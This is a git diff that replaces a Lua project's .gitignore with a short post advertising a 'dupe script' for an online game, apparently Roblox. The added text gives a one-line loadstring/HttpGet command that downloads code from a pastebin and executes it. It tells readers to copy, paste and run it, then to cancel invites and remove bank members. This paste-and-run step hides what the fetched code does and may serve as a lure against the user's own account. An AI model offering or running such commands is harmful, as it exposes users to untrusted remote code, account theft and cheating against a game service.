@@ -1,41 +1,9 @@
-# Compiled Lua sources
-luac.out
+XenoLord new dupe script (easter update) 
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+loadstring(game:HttpGet("https://pastebin.com/raw/MaavrBSR"))()
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
+copy and paste the script and execute
 
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+dont forgett cancel all outgoing invites
+dont forget to remove ur bank members (if u have)
+ur bank must me t2 - t8
